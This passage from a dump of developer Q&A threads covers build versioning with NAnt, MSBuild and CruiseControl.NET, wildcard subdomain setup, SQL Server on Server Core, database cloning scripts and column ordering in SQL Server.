name=\"svninfo\" description=\"get the svn checkout information\"&gt;    &lt;property name=\"svn.infotempfile\" value=\"${build.directory}\\\\svninfo.txt\" /&gt;    &lt;exec program=\"${svn.executable}\" output=\"${svn.infotempfile}\"&gt;        &lt;arg value=\"info\" /&gt;    &lt;/exec&gt;    &lt;loadfile file=\"${svn.infotempfile}\" property=\"svn.info\" /&gt;    &lt;delete file=\"${svn.infotempfile}\" /&gt;    &lt;property name=\"match\" value=\"\" /&gt;    &lt;regex pattern=\"URL: (?\\'match\\'.*)\" input=\"${svn.info}\" /&gt;    &lt;property name=\"svn.info.url\" value=\"${match}\"/&gt;    &lt;regex pattern=\"Repository Root: (?\\'match\\'.*)\" input=\"${svn.info}\" /&gt;    &lt;property name=\"svn.info.repositoryroot\" value=\"${match}\"/&gt;    &lt;regex pattern=\"Revision: (?\\'match\\'\\\\d+)\" input=\"${svn.info}\" /&gt;    &lt;property name=\"svn.info.revision\" value=\"${match}\"/&gt;    &lt;regex pattern=\"Last Changed Author: (?\\'match\\'\\\\w+)\" input=\"${svn.info}\" /&gt;    &lt;property name=\"svn.info.lastchangedauthor\" value=\"${match}\"/&gt;    &lt;echo message=\"URL: ${svn.info.url}\" /&gt;    &lt;echo message=\"Repository Root: ${svn.info.repositoryroot}\" /&gt;    &lt;echo message=\"Revision: ${svn.info.revision}\" /&gt;    &lt;echo message=\"Last Changed Author: ${svn.info.lastchangedauthor}\" /&gt;&lt;/target&gt;', 'My approach is to use the aforementioned plugin for ccnet and a nant echo task to generate a VersionInfo.cs file containing nothing but the version attributes. I only have to include the VersionInfo.cs file into the build\\n\\nThe echo task simply outputs the string I give it to a file.\\n\\nIf there is a similar MSBuild task, you can use the same approach. Here\\'s the small nant task I use:\\n\\n&lt;target name=\"version\" description=\"outputs version number to VersionInfo.cs\"&gt;\\n  &lt;echo file=\"${projectdir}/Properties/VersionInfo.cs\"&gt;\\n    [assembly: System.Reflection.AssemblyVersion(\"$(CCNetLabel)\")]\\n    [assembly: System.Reflection.AssemblyFileVersion(\"$(CCNetLabel)\")]\\n  &lt;/echo&gt;\\n&lt;/target&gt;\\n\\n\\nTry this:\\n\\n&lt;ItemGroup&gt;\\n    &lt;VersionInfoFile Include=\"VersionInfo.cs\"/&gt;\\n    &lt;VersionAttributes&gt;\\n        [assembly: System.Reflection.AssemblyVersion(\"${CCNetLabel}\")]\\n        [assembly: System.Reflection.AssemblyFileVersion(\"${CCNetLabel}\")]\\n    &lt;/VersionAttributes&gt;\\n&lt;/ItemGroup&gt;\\n&lt;Target Name=\"WriteToFile\"&gt;\\n    &lt;WriteLinesToFile\\n        File=\"@(VersionInfoFile)\"\\n        Lines=\"@(VersionAttributes)\"\\n        Overwrite=\"true\"/&gt;\\n&lt;/Target&gt;\\n\\n\\nPlease note that I\\'m not very intimate with MSBuild, so my script will probably not work out-of-the-box and need corrections...\\n', \"Be careful.  The structure used for build numbers is only a short so you have a ceiling on how high your revision can go.\\n\\nIn our case, we've already exceeded the limit.\\n\\nIf you attempt to put in the build number 99.99.99.599999, the file version property will actually come out as 99.99.99.10175.\\n\", 'CruiseControl.Net 1.4.4 has now an Assembly Version Labeller, which generates version numbers compatible with .Net assembly properties.\\n\\nIn my project I have it configured as:\\n\\n&lt;labeller type=\"assemblyVersionLabeller\" incrementOnFailure=\"true\" major=\"1\" minor=\"2\"/&gt;\\n\\n\\n(Caveat: assemblyVersionLabeller won\\'t start generating svn revision based labels until an actual commit-triggered build occurs.)\\n\\nand then consume this from my MSBuild projects with MSBuildCommunityTasks.AssemblyInfo :\\n\\n&lt;Import Project=\"$(MSBuildExtensionsPath)\\\\MSBuildCommunityTasks\\\\MSBuild.Community.Tasks.Targets\"/&gt;\\n&lt;Target Name=\"BeforeBuild\"&gt;\\n  &lt;AssemblyInfo Condition=\"\\'$(CCNetLabel)\\' != \\'\\'\" CodeLanguage=\"CS\" OutputFile=\"Properties\\\\AssemblyInfo.cs\" \\n  AssemblyTitle=\"MyTitle\" AssemblyCompany=\"MyCompany\" AssemblyProduct=\"MyProduct\"\\n  AssemblyCopyright=\"Copyright   2009\" ComVisible=\"false\" Guid=\"some-random-guid\"\\n  AssemblyVersion=\"$(CCNetLabel)\" AssemblyFileVersion=\"$(CCNetLabel)\"/&gt;\\n&lt;/Target&gt;\\n\\n\\nFor sake of completness, it\\'s just as easy for projects using NAnt instead of MSBuild:\\n\\n&lt;target name=\"setversion\" description=\"Sets the version number to CruiseControl.Net label.\"&gt;\\n    &lt;script language=\"C#\"&gt;\\n        &lt;references&gt;\\n            &lt;include name=\"System.dll\" /&gt;\\n        &lt;/references&gt;\\n        &lt;imports&gt;\\n            &lt;import namespace=\"System.Text.RegularExpressions\" /&gt;\\n        &lt;/imports&gt;\\n        &lt;code&gt;&lt;![CDATA[\\n             [TaskName(\"setversion-task\")]\\n             public class SetVersionTask : Task\\n             {\\n              protected override void ExecuteTask()\\n              {\\n               StreamReader reader = new StreamReader(Project.Properties[\"filename\"]);\\n               string contents = reader.ReadToEnd();\\n               reader.Close();\\n               string replacement = \"[assembly: AssemblyVersion(\\\\\"\" + Project.Properties[\"CCNetLabel\"] + \"\\\\\")]\";\\n               string newText = Regex.Replace(contents, @\"\\\\[assembly: AssemblyVersion\\\\(\"\".*\"\"\\\\)\\\\]\", replacement);\\n               StreamWriter writer = new StreamWriter(Project.Properties[\"filename\"], false);\\n               writer.Write(newText);\\n               writer.Close();\\n              }\\n             }\\n             ]]&gt;\\n        &lt;/code&gt;\\n    &lt;/script&gt;\\n    &lt;foreach item=\"File\" property=\"filename\"&gt;\\n        &lt;in&gt;\\n            &lt;items basedir=\"..\"&gt;\\n                &lt;include name=\"**\\\\AssemblyInfo.cs\"&gt;&lt;/include&gt;\\n            &lt;/items&gt;\\n        &lt;/in&gt;\\n        &lt;do&gt;\\n            &lt;setversion-task /&gt;\\n        &lt;/do&gt;\\n    &lt;/foreach&gt;\\n&lt;/target&gt;\\n\\n', 'Based on skolimas solution I updated the NAnt script to also update the AssemblyFileVersion. Thanks to skolima for the code!\\n\\n&lt;target name=\"setversion\" description=\"Sets the version number to current label.\"&gt;\\n    \\t&lt;script language=\"C#\"&gt;\\n    \\t\\t&lt;references&gt;\\n    \\t\\t\\t\\t&lt;include name=\"System.dll\" /&gt;\\n    \\t\\t&lt;/references&gt;\\n    \\t\\t&lt;imports&gt;\\n    \\t\\t\\t\\t&lt;import namespace=\"System.Text.RegularExpressions\" /&gt;\\n    \\t\\t&lt;/imports&gt;\\n    \\t\\t&lt;code&gt;&lt;![CDATA[\\n    \\t\\t\\t\\t [TaskName(\"setversion-task\")]\\n    \\t\\t\\t\\t public class SetVersionTask : Task\\n    \\t\\t\\t\\t {\\n    \\t\\t\\t\\t  protected override void ExecuteTask()\\n    \\t\\t\\t\\t  {\\n    \\t\\t\\t\\t   StreamReader reader = new StreamReader(Project.Properties[\"filename\"]);\\n    \\t\\t\\t\\t   string contents = reader.ReadToEnd();\\n    \\t\\t\\t\\t   reader.Close();\\t\\t\\t\\t\\t   \\n    \\t\\t\\t\\t   // replace assembly version\\n    \\t\\t\\t\\t   string replacement = \"[assembly: AssemblyVersion(\\\\\"\" + Project.Properties[\"label\"] + \"\\\\\")]\";\\n    \\t\\t\\t\\t   contents = Regex.Replace(contents, @\"\\\\[assembly: AssemblyVersion\\\\(\"\".*\"\"\\\\)\\\\]\", replacement);\\t\\t\\t\\t\\t   \\t\\t\\t\\t\\t   \\n    \\t\\t\\t\\t   // replace assembly file version\\n    \\t\\t\\t\\t   replacement = \"[assembly: AssemblyFileVersion(\\\\\"\" + Project.Properties[\"label\"] + \"\\\\\")]\";\\n    \\t\\t\\t\\t   contents = Regex.Replace(contents, @\"\\\\[assembly: AssemblyFileVersion\\\\(\"\".*\"\"\\\\)\\\\]\", replacement);\\t\\t\\t\\t\\t   \\t\\t\\t\\t\\t   \\n    \\t\\t\\t\\t   StreamWriter writer = new StreamWriter(Project.Properties[\"filename\"], false);\\n    \\t\\t\\t\\t   writer.Write(contents);\\n    \\t\\t\\t\\t   writer.Close();\\n    \\t\\t\\t\\t  }\\n    \\t\\t\\t\\t }\\n    \\t\\t\\t\\t ]]&gt;\\n    \\t\\t&lt;/code&gt;\\n    \\t&lt;/script&gt;\\n    \\t&lt;foreach item=\"File\" property=\"filename\"&gt;\\n    \\t\\t&lt;in&gt;\\n    \\t\\t\\t\\t&lt;items basedir=\"${srcDir}\"&gt;\\n    \\t\\t\\t\\t\\t\\t&lt;include name=\"**\\\\AssemblyInfo.cs\"&gt;&lt;/include&gt;\\n    \\t\\t\\t\\t&lt;/items&gt;\\n    \\t\\t&lt;/in&gt;\\n    \\t\\t&lt;do&gt;\\n    \\t\\t\\t\\t&lt;setversion-task /&gt;\\n    \\t\\t&lt;/do&gt;\\n    \\t&lt;/foreach&gt;\\n    &lt;/target&gt;\\n\\n', \"I'm not sure if this work with CCNET or not, but I've created an SVN version plug-in for the Build Version Increment project on CodePlex.  This tool is pretty flexible and can be set to automatically create a version number for you using the svn revision.  It doesn't require writing any code or editing xml, so yay!\\n\\nI hope this is helps!\\n\", 'No idea where I found this.  But I found this on the internet \"somewhere\".\\n\\nThis updates all the AssemblyInfo.cs files before the build takes place.\\n\\nWorks like a charm.  All my exe\\'s and dll\\'s show up as 1.2.3.333 (If \"333\" were the SVN revision at the time.) (And the original version in the AssemblyInfo.cs file was listed as \"1.2.3.0\")\\n\\n\\n\\n$(ProjectDir)   (Where my .sln file resides)\\n\\n$(SVNToolPath)  (points to svn.exe)\\n\\nare my custom variables, their declarations/definitions are not defined below.\\n\\n\\n\\nhttp://msbuildtasks.tigris.org/\\nand/or\\nhttps://github.com/loresoft/msbuildtasks\\nhas the ( FileUpdate and SvnVersion ) tasks.\\n\\n\\n\\n  &lt;Target Name=\"SubVersionBeforeBuildVersionTagItUp\"&gt;\\n\\n    &lt;ItemGroup&gt;\\n      &lt;AssemblyInfoFiles Include=\"$(ProjectDir)\\\\**\\\\*AssemblyInfo.cs\" /&gt;\\n    &lt;/ItemGroup&gt;\\n\\n    &lt;SvnVersion LocalPath=\"$(MSBuildProjectDirectory)\" ToolPath=\"$(SVNToolPath)\"&gt;\\n      &lt;Output TaskParameter=\"Revision\" PropertyName=\"MySubVersionRevision\" /&gt;\\n    &lt;/SvnVersion&gt;\\n\\n    &lt;FileUpdate Files=\"@(AssemblyInfoFiles)\"\\n            Regex=\"(\\\\d+)\\\\.(\\\\d+)\\\\.(\\\\d+)\\\\.(\\\\d+)\"\\n            ReplacementText=\"$1.$2.$3.$(MySubVersionRevision)\" /&gt;\\n  &lt;/Target&gt;\\n\\n\\nEDIT --------------------------------------------------\\n\\nThe above may start failing after your SVN revision number reaches 65534 or higher.\\n\\nSee:\\n\\nTurn off warning CS1607\\n\\nHere is the workaround.\\n\\n&lt;FileUpdate Files=\"@(AssemblyInfoFiles)\"\\nRegex=\"AssemblyFileVersion\\\\(&amp;quot;(\\\\d+)\\\\.(\\\\d+)\\\\.(\\\\d+)\\\\.(\\\\d+)\"\\nReplacementText=\"AssemblyFileVersion(&amp;quot;$1.$2.$3.$(SubVersionRevision)\" /&gt;\\n\\n\\nThe result of this should be:\\n\\nIn Windows/Explorer//File/Properties\\x80\\x80.\\n\\nAssembly Version will be 1.0.0.0.  \\n\\nFile Version will be 1.0.0.333 if 333 is the SVN revision.\\n'], ['I am looking to allow users to control of subdomain of an app I am toying with, much like Basecamp where it is customusername.seework.com.\\n\\nWhat is required on the DNS end to allow these to be created dynamically and be available instantly. \\n\\nAnd how do you recommend dealing with this in the logic of the site? Htaccess rule to  lookup the subdomain in the DB?\\n', \"The trick to that is to use URL rewriting so that name.domain.com transparently maps to something like domain.com/users/name on your server.  Once you start down that path, it's fairly trivial to implement.\", 'Don\\'t worry about DNS and URL rewriting\\r\\n\\r\\nYour DNS record will be static, something like:\\r\\n\\r\\n*.YOURDOMAIN.COM A 123.123.123.123\\r\\n\\r\\nAsk your DNS provider to do it for you (if it\\'s not done already) or do it by yourself if you have control over your DNS records. This will automatically point all your subdomains (current and future ones) into the same HTTP server.\\r\\n\\r\\nOnce it\\'s done, you will only need to parse HOST header on every single http request to detect what hostname was used to access your server-side scripts on your http server.\\r\\n\\r\\nAssuming you\\'re using ASP.NET, this is kind of silly example I came up with but works and demonstrates simplicity of this approach:\\r\\n\\r\\n&lt;%@ Language=\"C#\" %&gt;&lt;%string subDomain = Request.Url.Host.Split(\\'.\\')[0].ToUpper();if (subDomain == \"CLIENTXXX\") Response.Write(\"Hello CLIENTXXX, your secret number is 33\");else if (subDomain == \"CLIENTYYY\") Response.Write(\"Hello CLIENTYYY, your secret number is 44\");else Response.Write(subDomain+\" doesn\\'t exist\");%&gt;', 'The way we do this is to have a \\'catch all\\' for our domain name registered in DNS so that anything.ourdomain.com will point to our server.\\n\\nWith Apache you can set up a similar catch-all for your vhosts.  The ServerName must be a single static name but the ServerAlias directive can contain a pattern.\\n\\nServername www.ourdomain.com\\nServerAlias *.ourdomain.com\\n\\n\\nNow all of the domains will trigger the vhost for our project.  The final part is to decode the domain name actually used so that you can work out the username in your code, something like (PHP):\\n\\nlist( $username ) = explode( \".\", $_SERVER[ \"HTTP_HOST\" ] );\\n\\n\\nor a RewriteRule as already suggested that silently maps user.ourdomain.com/foo/bar to www.ourdomain.com/foo/bar?user=user or whatever you prefer.\\n', 'I was looking to do something similar (www.mysite.com/SomeUser).\\n\\nWhat I did was I edited 404.shtml to include this server side include (SSI) code:\\n\\n&lt;!--#include virtual=\"404.php\" -- &gt;\\n\\n\\nThen I created the file 404.php, where I parsed the URL to check for a user\\'s name and showed their info from the database.\\n'], ['I am using MSBuild to build my stuff. I want to use CruiseControl.net as by Build Server.\\r\\n\\r\\nNow, CCNET refers nAnt a lot, but it looks as if ccnet can do most of the stuff nant could do through the project configuration and msbuild. Also, nAnt seems a bit unsupported, with a Beta release that is almost a year old now.\\r\\n\\r\\nIn short: I am actually quite happy with MSBuild (especially since it\\'s the \"official\" compiler front end) and a bit uncomfortable with nAnt, but I do not want to judge prematurely.\\r\\n\\r\\nWhat would be reasons to use nAnt over MSBuild? Especially with ccnet, which seems to overlap a bit with nant in terms of features (and adding the automated build related stuff)', 'In my opinion it is more a question of personal preference.  nAnt is a great framework and MSBuild is almost as capable.  With the ability to easily develop custom tasks (in both frameworks) you can accomplish almost anything that you need to do.\\r\\n\\r\\nI cannot answer the \"still supported\" portion of your questions, but I would say if you are already comfortable with nAnt then it\\'s probably viable.  If you (or someone in your group) is familiar with MSBuild then that is a fine way to go as well.', 'Honestly it depends on what fits in to your environment better.  If you are using a lot of Non-Microsoft tools, nunit, ccnet, ncover.  You will probably find better support with nant.  Alternatively if you are using MSTest, TFSBuild, you will probably find MSBuild a better environment.  I would learn both and use which every fits more smoothly with your environment.', \"If you've already got a bunch of custom tasks you use with nAnt, stick with it - you don't gain much with MSBuild.  That said, there doesn't seem to be anything that nAnt can do that MSBuild can't at its core.  Both can call external tools, both can run .Net-based custom tasks, and both have a bunch of community tasks out there.\\r\\n\\r\\nWe're using MSBuild here for the same reason you are - it's the default build system for VS now, and we didn't have any nAnt-specific stuff to worry about.\\r\\n\\r\\nThe MSBuildCommunityTasks are a good third-party task base to start with, and covers most of the custom stuff I ever did in nAnt, including VSS and Subversion support.\", \"If you are quite happy with MSBuild, then I would stick with MSBuild.  This may be one of those cases where the tool you learn first is the one you will prefer.  I started with NAnt and can't quite get used to MSBuild.  I'm sure they will both be around for quite some time.\\r\\n\\r\\nThere are some fundamental differences between the two, probably best highlighted by this conversation between some NAnt fans and a Microsoftie.\\r\\n\\r\\nInterestingly, Jeremy Miller asked the exact opposite question on his blog last year.  \", \"CC.NET is simply the build server technology, not the build script technology. We use CC.NET at work to very successfully call MSBuild build scripts with no problems.\\n\\nNAnt is an older and more mature build scripting language, but they are both similar in how they work. There are very few things I could do in NAnt that I can't also do in MSBuild, so it really comes down to which one you are more comfortable with. As far as how active NAnt is, don't go by when the last release was...instead go by when the last nightly build was. NAnt tends to go a long time between releases, but the nightly builds are usually pretty stable.\\n\", 'Like what so many people have already indicated, the answer here is \"it depends\". There are some things like repeating operations that are much simpler and cleaner in NAnt. See the MSDN forums for a discussion about this.\\n', 'I find that you can also use a hybrid approach too, especially in larger projects.  A lot of our nant scripts are being converted to msbuild when new components are developed.  Both support the same major features and can call each other if you find a task that is natively supported in one but not the other.\\n\\nFor new .NET development starting with MSBuild can save you a lot of time since it can run the solution files directly.  Extending from the main compilation to perform other tasks (source control, deployment, etc) works quite well.\\n'], ['I\\'m setting up a dedicated SQL Server 2005 box on Windows Server 2008 this week, and would like to pare it down to be as barebones as possible while still being fully functional.\\n\\nTo that end, the \"Server Core\" option sounds appealing, but I\\'m not clear about whether or not I can run SQL Server on that SKU.  Several services are addressed on the Microsoft website, but I don\\'t see any indication about SQL Server.\\n\\nDoes anyone know definitively?\\n', 'Not sure how credible this source is, but:\\n\\n\\n  The Windows Server 2008 Core edition can:\\n  \\n  \\n  Run the file server role.\\n  Run the Hyper-V virtualization server role.\\n  Run the Directory Services role.\\n  Run the DHCP server role.\\n  Run the IIS Web server role.\\n  Run the DNS server role.\\n  Run Active Directory Lightweight Directory Services.\\n  Run the print server role.\\n  \\n  \\n  The Windows Server 2008 Core edition cannot:\\n  \\n  \\n  Run a SQL Server.\\n  Run an Exchange Server.\\n  Run Internet Explorer.\\n  Run Windows Explorer.\\n  Host a remote desktop session.\\n  Run MMC snap-in consoles locally.\\n  \\n\\n', \"No. For some things you will need the .net Framework (like reporting services), and you can't install it (in a supported way) in a server core.\\n\", \"Server Core won't be very useful (to me at least, and I think many others as well) until they get a version of .Net framework on it.  Maybe a specialized subset like they have in the Compact Framework on smart phones.\\n\", 'ASP.Net will be enabled on server core in R2.\\n', \"Server Core 2008 R2 can run Sql Server, but this is unsupported (for now). Check http://www.nullsession.com/2009/06/02/sql-server-2008-on-server-core-2008-r2/ for an article + video on how it's done.\\n\", 'Following are new features for Server 2008 R2 Server Core:\\n\\n\\n.NET Framework \\x80\\x93 2.0, 3.0, 3.5.1, 4.0 are now supported on Server Core installation\\nASP.NET \\x80\\x93 as .NET is now supported on Server Core R2 ASP.NET can be enabled\\nPowerShell\\nAD CS \\x80\\x93 AD Certificate Services role can be installed on Server Core R2 system\\n\\n'], ['I always create a new empty database, after that backup and restore of the existing database into it, but is this really the best way? As it seems very error prone and over complicated for me.\\n', 'It is possible to skip the step of creating the empty database. You can create the new database as part of the restore process.\\r\\n\\r\\nThis is actually the easiest and best way I know of to clone a database. You can eliminate errors by scripting the backup and restore process rather than running it through the SQL Server Management Studio\\r\\n\\r\\nThere are two other options you could explore:\\r\\n\\r\\n\\r\\nDetach the database, copy the .mdf file and re-attach.\\r\\nUse SQL Server Integration Services (SSIS) to copy all the objects over\\r\\n\\r\\n\\r\\nI suggest sticking with backup and restore and automating if necessary.', \"Here's a dynamic sql script I've used in the past.  It can be further modified but it will give you the basics.  I prefer scripting it to avoid the mistakes you can make using the Management Studio:\\r\\n\\r\\nDeclare @OldDB varchar(100)Declare @NewDB varchar(100)Declare @vchBackupPath varchar(255)Declare @query varchar(8000)/*Test code to implement Select @OldDB = 'Pubs'Select @NewDB = 'Pubs2'Select @vchBackupPath = '\\\\\\\\dbserver\\\\C$\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL.1\\\\MSSQL\\\\Backup\\\\pubs.bak'*/SET NOCOUNT ON;Select @query = 'Create Database ' + @NewDBexec(@query)Select @query = 'Declare @vBAKPath varchar(256)declare @oldMDFName varchar(100)declare @oldLDFName varchar(100)declare @newMDFPath varchar(100)declare @newLDFPath varchar(100)declare @restQuery varchar(800)select @vBAKPath = ''' + @vchBackupPath + '''select @oldLDFName = name from ' + @OldDB +'.dbo.sysfiles where filename like ''%.ldf%''select @oldMDFName = name from  ' + @OldDB +'.dbo.sysfiles where filename like ''%.mdf%''select @newMDFPath = physical_name from ' + @NewDB +'.sys.database_files where type_desc = ''ROWS''select @newLDFPath = physical_name from ' + @NewDB +'.sys.database_files where type_desc = ''LOG''select @restQuery = ''RESTORE DATABASE ' + @NewDB + ' FROM DISK = N'' + '''''''' + @vBAKpath + '''''''' + '' WITH MOVE N'' + '''''''' + @oldMDFName + '''''''' +  '' TO N'' + '''''''' + @newMDFPath + '''''''' +  '', MOVE N'' + '''''''' + @oldLDFName + '''''''' +  '' TO N'' + '''''''' + @newLDFPath + '''''''' +  '', NOUNLOAD, REPLACE, STATS = 10''exec(@restQuery)--print @restQuery'exec(@query)\", \"The Publish to Provider functionality has worked great for me.  See Scott Gu's Blog Entry.\\r\\n\\r\\nIf you need something really robust look  at redgate software's tools here...if you are doing much SQL at all, these are worth the $$.\", \"Backup and Restore is the most straight-forward way I know.  You have to be careful between servers as security credentials don't come with the restored database.\", '::================ BackUpAllMyDatabases.cmd ============= START\\n::BackUpAllMyDatabases.cmd\\n:: COMMAND LINE BATCH SCRIPT FOR TAKING BACKUP OF ALL DATABASES \\n\\n::RUN THE SQL SCRIPT VIA THE COMMAND LINE WITH LOGGING \\nsqlcmd -S localhost -e  -i \"BackUpAllMyDatabases.sql\" -o Result_Of_BackUpAllMyDatabases.log\\n\\n::VIEW THE RESULTS\\nResult_Of_BackUpAllMyDatabases.log\\n\\n::pause\\n::================ BackUpAllMyDatabases.cmd ============= END\\n\\n\\n--=================================================BackUpAllMyDatabases.sql start\\nDECLARE @DBName varchar(255)\\n\\nDECLARE @DATABASES_Fetch int\\n\\nDECLARE DATABASES_CURSOR CURSOR FOR\\n    select\\n        DATABASE_NAME   = db_name(s_mf.database_id)\\n    from\\n        sys.master_files s_mf\\n    where\\n       -- ONLINE\\n        s_mf.state = 0 \\n\\n       -- Only look at databases to which we have access\\n    and has_dbaccess(db_name(s_mf.database_id)) = 1 \\n\\n        -- Not master, tempdb or model\\n    --and db_name(s_mf.database_id) not in (\\'Master\\',\\'tempdb\\',\\'model\\')\\n    group by s_mf.database_id\\n    order by 1\\n\\nOPEN DATABASES_CURSOR\\n\\nFETCH NEXT FROM DATABASES_CURSOR INTO @DBName\\n\\nWHILE @@FETCH_STATUS = 0\\nBEGIN\\n    declare @DBFileName varchar(256)    \\n    set @DBFileName = @DbName + \\'_\\' + replace(convert(varchar, getdate(), 112), \\'-\\', \\'.\\') + \\'.bak\\'\\n--REMEMBER TO PUT HERE THE TRAILING \\\\ FOR THE DIRECTORY !!!\\n    exec (\\'BACKUP DATABASE [\\' + @DBName + \\'] TO  DISK = N\\'\\'D:\\\\DATA\\\\BACKUPS\\\\\\' + \\n        @DBFileName + \\'\\'\\' WITH NOFORMAT, INIT,  NAME = N\\'\\'\\' + \\n        @DBName + \\'-Full Database Backup\\'\\', SKIP, NOREWIND, NOUNLOAD,  STATS = 100\\')\\n\\n    FETCH NEXT FROM DATABASES_CURSOR INTO @DBName\\nEND\\n\\nCLOSE DATABASES_CURSOR\\nDEALLOCATE DATABASES_CURSOR\\n\\n--BackUpAllMyDatabases==========================end\\n\\n--======================RestoreDbFromFile.sql start\\n-- Restore database from file\\n-----------------------------------------------------------------\\nuse master\\ngo\\n\\ndeclare @backupFileName varchar(100), @restoreDirectory varchar(100),\\n@databaseDataFilename varchar(100), @databaseLogFilename varchar(100),\\n@databaseDataFile varchar(100), @databaseLogFile varchar(100),\\n@databaseName varchar(100), @execSql nvarchar(1000)\\n\\n-- Set the name of the database to restore\\nset @databaseName = \\'ReplaceDataBaseNameHere\\'\\n-- Set the path to the directory containing the database backup\\nset @restoreDirectory = \\'ReplaceRestoreDirectoryHere\\' -- such as \\'c:\\\\temp\\\\\\'\\n\\n-- Create the backup file name based on the restore directory, the database name and today\\'s date\\n\\n@backupFileName = @restoreDirectory + @databaseName + \\'-\\' + replace(convert(varchar, getdate(), 110), \\'-\\', \\'.\\') + \\'.bak\\'\\n\\n\\n-- set @backupFileName = \\'D:\\\\DATA\\\\BACKUPS\\\\server.poc_test_fbu_20081016.bak\\'\\n\\n-- Get the data file and its path\\nselect @databaseDataFile = rtrim([Name]),\\n@databaseDataFilename = rtrim([Filename])\\nfrom master.dbo.sysaltfiles as files\\ninner join\\nmaster.dbo.sysfilegroups as groups\\non\\n\\nfiles.groupID = groups.groupID\\nwhere DBID = (\\nselect dbid\\nfrom master.dbo.sysdatabases\\nwhere [Name] = @databaseName\\n)\\n\\n-- Get the log file and its path\\nselect @databaseLogFile = rtrim([Name]),\\n@databaseLogFilename = rtrim([Filename])\\nfrom master.dbo.sysaltfiles as files\\nwhere DBID = (\\nselect dbid\\nfrom master.dbo.sysdatabases\\nwhere [Name] = @databaseName\\n)\\nand\\ngroupID = 0\\n\\nprint \\'Killing active connections to the \"\\' + @databaseName + \\'\" database\\'\\n\\n-- Create the sql to kill the active database connections\\nset @execSql = \\'\\'\\nselect @execSql = @execSql + \\'kill \\' + convert(char(10), spid) + \\' \\'\\nfrom master.dbo.sysprocesses\\nwhere db_name(dbid) = @databaseName\\nand\\nDBID &lt;&gt; 0\\nand\\nspid &lt;&gt; @@spid\\nexec (@execSql)\\n\\nprint \\'Restoring \"\\' + @databaseName + \\'\" database from \"\\' + @backupFileName + \\'\" with \\'\\nprint \\' data file \"\\' + @databaseDataFile + \\'\" located at \"\\' + @databaseDataFilename + \\'\"\\'\\nprint \\' log file \"\\' + @databaseLogFile + \\'\" located at \"\\' + @databaseLogFilename + \\'\"\\'\\n\\nset @execSql = \\'\\nrestore database [\\' + @databaseName + \\']\\nfrom disk = \\'\\'\\' + @backupFileName + \\'\\'\\'\\nwith\\nfile = 1,\\nmove \\'\\'\\' + @databaseDataFile + \\'\\'\\' to \\' + \\'\\'\\'\\' + @databaseDataFilename + \\'\\'\\',\\nmove \\'\\'\\' + @databaseLogFile + \\'\\'\\' to \\' + \\'\\'\\'\\' + @databaseLogFilename + \\'\\'\\',\\nnorewind,\\nnounload,\\nreplace\\'\\n\\nexec sp_executesql @execSql\\n\\nexec(\\'use \\' + @databaseName)\\ngo\\n\\n-- If needed, restore the database user associated with the database\\n/*\\nexec sp_revokedbaccess \\'myDBUser\\'\\ngo\\n\\nexec sp_grantdbaccess \\'myDBUser\\', \\'myDBUser\\'\\ngo\\n\\nexec sp_addrolemember \\'db_owner\\', \\'myDBUser\\'\\ngo\\n\\nuse master\\ngo\\n*/\\n--======================RestoreDbFromFile.sql\\n\\n'], ['If I\\'m adding a column to a table in Microsoft SQL Server, can I control where the column is displayed logically in queries?\\n\\nI don\\'t want to mess with the physical layout of columns on disk, but I would like to logically group columns together when possible so that tools like SQL Server Management Studio list the contents of the table in a convenient way.\\n\\nI know that I can do this through SQL Management Studio by going into their \"design\" mode for tables and dragging the order of columns around, but I\\'d like to be able to do it in raw SQL so that I can perform the ordering scripted from the command line.\\n', 'You can not do this programatically (in a safe way that is) without creating a new table. \\r\\nWhat Enterprise Manager does when you commit a reordering is to create a new table, move the data and then delete the old table and rename the new table to the existing name. \\r\\nIf you want your columns in a particular order/grouping without altering their physical order, you can create a view which can be whatever you desire.', \"When Management Studio does it, it's creating a temporary table, copying everything across, dropping your original table and renaming the temporary table.  There's no simple equivalent T-SQL statement.\\r\\n\\r\\nIf you don't fancy doing that, you could always create a view of the table with the columns in the order you'd like and use that?\\r\\n\\r\\nEdit: beaten!\", 'If I understand your question, you want to affect what columns are returned first, second, third, etc in existing queries, right?\\r\\nIf all of your queries are written with SELECT * FROM TABLE - then they will show up in the output as they are layed out in SQL. If your queries are written with SELECT Field1, Field2 FROM TABLE - then the order they are layed out in SQL does not matter.', \"It can be done using SQL, by modifying the system tables directly. For example, look here:\\n\\nAlter table - Add new column in between\\n\\nHowever, I would not recommend playing with system tables, unless it's absolutely necessary.\\n\", 'I think what everyone here is missing, is that although not everyone has to deal with 10\\'s, 20\\'s, or 1000\\'s instances of the same software system installed throughout the country and world ... those of us that design commercially sold software do so.  As a result, we expand systems over time, expand tables by adding fields as new capability is needed, and as those fields are identified do belong in an existing table, and as such, over a decade of expanding , growing, adding fields, etc to tables .... and then having to work with those tables from design, to support, to sometimes digging into raw data/troubleshooting to debug new functionality bugs .... it is incredibly aggravating to not have the primary information you want to see within the first handful of fields, when you may have tables with 30-40-50 or even 90 fields and yes in a strictly normalized database.\\n\\nI\\'ve often wished I could do this, for this exact reason.  But short of doing exactly what SQL does, Building a Create Script for a new Table the way I want it, writing the Insert to it, then dropping all existing constraints, relationships, keys, index, etc etc etc from the existing table and renaming the \"new\" table back to the old name, and then reading all those keys, relationships, index, etc etc ....\\n\\nIs not only tedious, time-consuming but ... in five more years, will need to happen again ....\\n\\nIt\\'s so close to worth that massive amount of work, however the point is ... it won\\'t be the last time we need this ability, since our systems will continue to grow, expand, and get fields in a wacked ordered driven by need/design additions.\\n\\nA majority of developers think from a single system standpoint that serves a single company or very specific hard box market.\\n\\nThe \"off-the-shelf\" but significantly progressive designers and leaders of development in their market space will always have to deal with this problem, over and over.....would love a creative solution if any one has one.  This could easily save my company a dozen hours a week, just not having to scroll over, or remember where \"that\" field is in the source data table....\\n', 'There is one way, but its only temporarily for the query itself. For example, \\n\\nLets say you have 5 tables. \\nTable is called T_Testing\\n\\nFirstName, LastName, PhoneNumber, Email, and Member_ID\\n\\nyou want it to list their ID, then Last Name, then FirstName, then Phone then Email. \\n\\nYou can do it as per the Select. \\n\\nSelect Member_ID, LastName, FirstName, PhoneNumber, Email\\nFrom T_Testing\\n\\n\\nOther than that, if you just want the LastName to Show before first name for some reason, you can do it also as follows: \\n\\nSelect LastName, *\\nFrom T_Testing\\n\\n\\nThe only thing you wanna be sure that you do is that the OrderBy or Where Function needs to be denoted as Table.Column if you are going to be using a Where or OrderBy\\n\\nExample: \\n\\nSelect LastName, *\\nFrom T_Testing\\nOrder By T_Testing.LastName 